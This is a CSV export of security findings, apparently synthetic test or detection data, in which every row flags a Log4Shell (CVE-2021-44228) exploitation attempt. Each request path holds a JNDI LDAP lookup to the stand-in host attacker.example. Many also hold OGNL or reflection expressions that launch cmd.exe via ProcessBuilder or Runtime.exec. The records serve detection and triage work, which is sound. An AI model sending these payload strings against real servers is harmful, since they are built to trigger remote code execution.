"FINDING_ID","DETECTED_AT","FINDING_TYPE","SEVERITY","STATUS","STATUS_COMMENT","TIMESTAMP","IP_ADDRESS","REQUEST_PATH","REQUEST_METHOD","STATUS_CODE","BYTES_SENT","BACKEND_IP","DESCRIPTION","LAST_UPDATED_AT","LAST_UPDATED_BY","EMAIL_SENT","EMAIL_SENT_AT"
115,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","181.155.52.155","/dashboard/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",301,1595,"192.168.44.109","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
116,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","207.179.109.8","/login/assets/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","GET",404,8737,"10.40.63.139","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
117,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","145.92.163.140","/contact/assets/${jndi:ldap://attacker.example/Exploit<injection>}.html","GET",500,2538,"172.26.43.242","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
118,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","205.45.69.82","/profile/css/${jndi:ldap://attacker.example/Exploit}.html","POST",200,6106,"10.9.51.201","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
119,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","38.12.109.69","/login/docs/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","DELETE",301,6572,"192.168.93.50","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
120,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","25.157.110.196","/profile/images/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","DELETE",201,9809,"192.168.164.66","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
121,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","52.82.68.66","/dashboard/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","POST",401,2858,"172.26.187.65","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
122,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","211.28.4.3","/dashboard/css/${jndi:ldap://attacker.example/Exploit}.html","POST",200,7517,"10.133.237.184","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
123,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","39.222.89.132","/home/docs/${jndi:ldap://attacker.example/Exploit<injection>}.html","GET",302,475,"10.137.245.157","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
124,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","140.234.238.96","/logout/docs/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","DELETE",401,3275,"10.68.226.213","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
125,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","30.141.162.22","/login/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",503,7202,"192.168.30.213","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
126,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","203.14.81.229","/register/images/${jndi:ldap://attacker.example/Exploit#{injection}}.html","DELETE",400,7854,"172.17.111.140","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
127,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","41.175.20.17","/dashboard/js/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","DELETE",500,461,"192.168.155.60","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
128,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","200.213.227.146","/login/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",500,9574,"192.168.15.134","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
129,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","141.144.221.248","/dashboard/js/${jndi:ldap://attacker.example/Exploit}.html","PUT",204,2214,"192.168.69.161","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
130,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","168.87.203.159","/profile/assets/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","POST",403,3939,"10.163.57.103","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
134,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","52.49.113.17","/contact/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","POST",400,4045,"10.97.158.8","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
135,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","214.104.200.7","/logout/css/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","GET",204,5650,"192.168.145.154","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
136,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","111.146.172.191","/logout/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","POST",201,9153,"10.60.174.17","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
142,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","90.167.38.65","/dashboard/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",403,7183,"172.23.69.201","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
143,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","214.81.215.223","/register/js/${jndi:ldap://attacker.example/Exploit}.html","POST",403,8359,"10.1.191.113","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
144,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","160.37.126.148","/home/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",301,458,"192.168.44.158","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
145,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","129.14.96.255","/register/css/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","POST",503,4167,"172.29.94.54","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
150,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","137.223.188.76","/home/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",301,3653,"10.64.168.38","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
158,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","161.92.232.198","/profile/assets/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","POST",403,1279,"172.30.118.72","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
159,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","215.40.191.70","/home/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","POST",201,5852,"192.168.159.108","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
160,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","137.120.125.227","/profile/docs/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","PUT",503,8112,"10.4.216.169","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
161,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","217.196.183.156","/contact/assets/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","POST",200,9496,"192.168.112.19","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
162,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","188.40.212.244","/home/css/${jndi:ldap://attacker.example/Exploit}.html","DELETE",503,4057,"192.168.40.68","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
163,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","7.235.91.142","/contact/css/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","DELETE",301,7159,"172.30.60.212","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
166,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","8.218.60.192","/register/assets/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","POST",200,1250,"172.20.111.211","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
167,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","201.218.114.130","/dashboard/assets/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",201,663,"10.240.93.142","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
168,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","197.52.56.34","/login/assets/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",302,2191,"192.168.233.20","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
169,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","222.120.3.198","/contact/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",500,4631,"172.25.94.21","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
170,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","149.139.88.232","/home/docs/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","DELETE",301,8830,"172.31.124.245","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
171,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","214.244.104.220","/about/js/${jndi:ldap://attacker.example/Exploit<injection>}.html","PUT",302,2630,"10.56.239.180","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
172,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","175.213.121.73","/logout/assets/${jndi:ldap://attacker.example/Exploit<injection>}.html","DELETE",503,5527,"172.22.193.135","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
173,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","172.122.145.117","/home/assets/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",400,5060,"192.168.118.213","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
174,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","213.27.25.240","/dashboard/assets/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","GET",201,9462,"172.28.72.220","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
175,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","145.170.198.246","/about/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",404,9695,"10.111.3.57","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
176,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","158.124.162.69","/home/docs/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","PUT",204,7384,"10.63.58.253","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
180,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","45.15.160.233","/contact/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",403,1266,"172.31.242.69","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
181,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","208.208.250.191","/login/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",201,6534,"10.90.98.42","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
